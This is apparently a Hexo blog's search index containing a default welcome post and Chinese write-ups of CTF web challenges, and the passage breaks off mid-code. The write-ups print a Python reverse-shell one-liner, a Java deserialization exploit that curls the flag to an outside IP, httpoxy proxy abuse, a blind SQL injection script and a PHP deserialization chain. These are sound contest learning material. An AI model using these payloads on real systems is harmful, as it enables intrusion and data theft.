<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2020/03/03/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>V&amp;N招新赛web部分题解</title>
    <url>/2020/02/29/V/</url>
    <content><![CDATA[<p>V&amp;N招新赛部分web题解</p>
<a id="more"></a>

<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>考点：ctfd漏洞</p>
<p>参考链接<a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a>漏洞的相关分析，上文写的很详细，这里就不再介绍。</p>
<p>解题步骤：</p>
<ol>
<li>先注册一个admin的账号，通过在admin前面加空格来绕过重复限制。</li>
<li>生成忘记密码的链接。</li>
<li>更改自己用户名为非admin.</li>
<li>点击更改密码的链接，改后登录</li>
</ol>
<p><img src="V/image-20200229183951772.png" alt="image-20200229183951772"></p>
<p>下载，后就得到flag.</p>
<h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><p>考点：python反弹shell   proc目录</p>
<p>访问就可以得到源码，右键源代码看到的代码自动有换行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p>看到很简单的源码，有两个路由，</p>
<ul>
<li>/  ：可以得到app.py源码</li>
<li>/shell  : 通过传入c变量可以执行命令，但是会删除flag.txt文件。</li>
</ul>
<p>开始时，想着通过类似时间盲注的方法去做题，后来一想python可以直接反弹shell,</p>
<p>然后开了个linux-lab，反弹shell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.216.234%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>

<p><img src="V/image-20200229184920698.png" alt="image-20200229184920698"></p>
<p>之后就是找flag了，这里又学到了linux中/proc目录内容。更详细的可以<a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">参考</a>这篇文章，总结的很详细。</p>
<p><img src="V/image-20200229185248748.png" alt="image-20200229185248748"></p>
<p>由于ps命令不可用，这里我们就去翻一下文件夹</p>
<p><img src="V/image-20200229185546941.png" alt=""></p>
<p>最后在/proc/10/fd文件里看见了flag</p>
<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>这题也给了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>队友直接发了一个<strong>cve-2016-5385</strong>，然后去网上查一查，看到<a href="https://github.com/vulhub/vulhub/blob/master/cgi/httpoxy/www/index.php" target="_blank" rel="noopener">vulhub里面就有</a>看一下里里面的源码，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: application/json; charset=utf-8'</span>);</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> Client([</span><br><span class="line">    <span class="comment">// Base URI is used with relative requests</span></span><br><span class="line">    <span class="string">'base_uri'</span> =&gt; <span class="string">'http://httpbin.org'</span>,</span><br><span class="line">    <span class="comment">// You can set any number of default request options.</span></span><br><span class="line">    <span class="string">'timeout'</span>  =&gt; <span class="number">2.0</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$response = $client-&gt;get(<span class="string">'http://httpbin.org/get'</span>);</span><br><span class="line"></span><br><span class="line">$body = $response-&gt;getBody();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $body;</span><br></pre></td></tr></table></figure>

<p>源码差不多</p>
<blockquote>
<p>简单来说，根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p>
</blockquote>
<p>这种漏洞的利用，通过在http请求头中添加Proxy头，就可以把请求代理到恶意的代理服务器，进而可以窃取数据报的敏感信息，也可以篡改请求报的响应。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面的关键代码可以看到，要得到flag,需要满足<code>$data[&#39;success&#39;] === true</code>，如果请求代理到我们的服务器，然后回向<a href="http://127.0.0.1:5000/api/eligible发送请求，如果发送的请求，json解码后，$data[&#39;success&#39;]为true,就会得到flag。" target="_blank" rel="noopener">http://127.0.0.1:5000/api/eligible发送请求，如果发送的请求，json解码后，$data[&#39;success&#39;]为true,就会得到flag。</a></p>
<p>解题步骤</p>
<ul>
<li>用我们的apache服务器作为代理服务器</li>
</ul>
<p><img src="V/image-20200229192230132.png" alt="image-20200229192230132"></p>
<ul>
<li><p>然后用php在本地起一个服务器，监听5000端口，在api/eligible目录下新建index.php,脚本输出，解码后$data[‘success’]为true。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"success"</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($a);</span><br></pre></td></tr></table></figure>

<p>本地在用php启一个php的内置服务器，端口为5000</p>
<p><img src="V/image-20200229193926226.png" alt="image-20200229193926226"></p>
</li>
<li><p>然后burp再发包，触发条件，得到flag。</p>
</li>
</ul>
<p><img src="V/image-20200229194145302.png" alt="image-20200229194145302"></p>
<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>考点：java反序列化</p>
<p>题目给了源码是war包，用tomcat部署后，</p>
<p><img src="V/image-20200301110922154.png" alt="image-20200301110922154"></p>
<p>浏览一下功能，可以上传，但是要webmanage权限，开始以为要修改权限，上传个图片马 什么的。</p>
<p>然后审计源码，由于之前没有做过java的题，对java的程序框架不是很了解，一边百度一边理解，<img src="V/image-20200301111336301.png" alt=""></p>
<p>程序大致的框架就是这样（本人的理解），有控制器，有jsp文件，lib文件夹里面的都是引用的jar包，看了里面的jar包，没有反序列化漏洞的版本。这里的ClientinfoFilter就是一个全局过滤器，在web.xml文件中，</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.filters.ClentInfoFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>*<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>filter-class  必需元素，它指定过滤器实现类的完全限定名。</p>
<p>filter-name  这个必需的元素必须与用filter元素声明时给予过滤器的名称相匹配。</p>
<p>servlet-name  此元素给出一个名称，此名称必须与利用servlet元素给予servlet或JSP页面的名称相匹配。</p>
</blockquote>
<p><a href="http://www.51gjie.com/javaweb/868.html" target="_blank" rel="noopener">参考链接</a></p>
<p><img src="V/image-20200301112633247.png" alt="image-20200301112633247"></p>
<p>然后我们继续看ClientinfoFilter中的doFilter方法，</p>
<p><img src="V/image-20200301112812260.png" alt="image-20200301112812260"></p>
<p>首先去取cookie,如果cookie中有cinfo,exist就为true,然后进入判断，将cookie中的cinfo值base64解码，然后调用Tools.parse()方法，继续跟进</p>
<p><img src="V/image-20200301113107762.png" alt="image-20200301113107762"></p>
<p>parse方法对输入进行了反序列化，可以发现Tools类重写了readObject方法，<a href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/" target="_blank" rel="noopener">那么参考大佬的文章</a>，重写反序列化方法会有风险，而且这里重写的方法还调用了ProcessBuilder().start)(),这个方法可以执行命令，到了这里，我们的思路就很清晰了，通过构造cookie,触发反序列化，调用重写的readObject方法，进而调用ProcessBuilder.start()方法，执行命令。</p>
<p>首先，我们在本地尝试一下可不可以，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//exp.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Tools test = <span class="keyword">new</span> Tools();</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Tools.create(test);</span><br><span class="line">            Base64.Encoder  encoder = Base64.getEncoder();</span><br><span class="line">            System.out.println(encoder.encodeToString(bytes));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上图我们可以看到create()方法中调用了writeObject，所以我们可以重写writeObject（）函数，来进一步利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Tools.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String testCall;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tools</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="comment">//String[] cmd=&#123;"/bin/sh", "-c","curl -d `/readflag` 174.0.219.93:8888"&#125;;</span></span><br><span class="line">        String[] cmd=&#123;<span class="string">"calc"</span>&#125;;</span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="V/image-20200301120719913.png" alt="image-20200301120719913"></p>
<p>将运行后的base64，放入test.java中测试一下</p>
<p><img src="V/image-20200301120834520.png" alt="image-20200301120834520"></p>
<p>之后就可以执行命令了，<a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">这里参考一下师傅的文章</a>，里面讲解了Runtime.getRuntime().exec(cmd)和ProcessBuilder pb=new ProcessBuilder(cmd)的区别和用法，</p>
<p>然后我们把命令改下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">      String[] cmd=&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>,<span class="string">"curl -d `/readflag` 174.0.219.93:8888"</span>&#125;;</span><br><span class="line">      <span class="comment">//String[] cmd=&#123;"calc"&#125;;</span></span><br><span class="line">      out.writeObject(cmd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>生成的替换下cookie,就得到了 flag</p>
<p><img src="V/image-20200301122930606.png" alt="image-20200301122930606"></p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
  </entry>
  <entry>
    <title>2020新春战役网络安全公益赛web部分题解</title>
    <url>/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/</url>
    <content><![CDATA[<p>打了ichunqiu的新春公益赛，web题大部分比较友好。</p>
<a id="more"></a>

<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day_1"></a>Day_1</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>进去一个登录界面，可以注册，开始看到forgot，但是没有忘记密码的链接，注册登进去后，有个查询界面需要admin权限，然后注册admin用户也没有权限，之后试着可以用万能密码进来，然后再查询key的界面测了半天，啥也没出来，后来一想万能密码都可以登，那么登录出就可以注了。。。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://724572ef5f71464aa9d50b6a9540181cf1f2d153e3ee45e7.changame.ichunqiu.com/index.php"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		<span class="comment">#payload=r"admin' and 1=(ascii(mid((select group_concat(column_NAME) from information_schema.columnS where table_name='flag'),&#123;&#125;,1))&gt;&#123;&#125;) or '1"</span></span><br><span class="line">		payload=<span class="string">r"admin' and 1=(ascii(mid((select flaaag from flag limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;) or '1"</span></span><br><span class="line">		data=&#123;<span class="string">"lname"</span>:payload.format(i,mid),<span class="string">"lpass"</span>:<span class="string">"ff"</span>&#125;</span><br><span class="line">		print(payload.format(i,mid))</span><br><span class="line">		r=requests.post(url,data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">b"./zhaopin.php"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag)</span><br><span class="line">	<span class="comment">#backup,flag,user</span></span><br><span class="line">	<span class="comment">#id,flaaag</span></span><br></pre></td></tr></table></figure>

<p>更新：之前说在key那里试了半天没有成功，当时order by 时题目报错一直在猜后台的sql语句，后来看了<a href="https://www.gem-love.com/ctf/1669.html#i" target="_blank" rel="noopener">颖奇师傅的wp后</a>，这里尽管报错还是可以注入的。</p>
<p>首先用<code>oeder by</code>查列数</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224124224465.png" alt="image-20200224124224465"></p>
<p>然后看回显位，为2，查表</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224123828230.png" alt="image-20200224123828230"></p>
<p>查列</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224124516526.png" alt="image-20200224124516526"></p>
<p>查flag</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224124618322.png" alt="image-20200224124618322"></p>
<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>这题就不用说了，啥过滤都没有。</p>
<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>扫目录有<a href="http://www.zip，看到" target="_blank" rel="noopener">www.zip，看到</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有用die用的echo，之后的程序还会执行，而且</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>safe函数还会改变序列化后的值，如果序列化内容有数组里的字符串，那么序列化后的值就会变长，我们可以利用这点和php反序列化的容错性来构造反序列化链，</p>
<p><img src="2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222162442935.png" alt="image-20200222162442935"></p>
<p>通过反序列化最后触发login()，返回admin的密码，登录得到flag。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">	<span class="keyword">public</span> $password = <span class="string">"admin"</span>;</span><br><span class="line">	<span class="keyword">public</span> $mysqli;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $id;</span><br><span class="line">	<span class="keyword">public</span> $newinfo;</span><br><span class="line">	<span class="keyword">public</span> $sql;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo, $sql)</span> </span>&#123;</span><br><span class="line">		$newInfo = unserialize($newInfo);</span><br><span class="line">		$upDate = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $age;</span><br><span class="line">	<span class="keyword">public</span> $nickname;</span><br><span class="line">	<span class="keyword">public</span> $CtrlCase;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age, $nickname)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;nickname = $nickname;</span><br><span class="line">	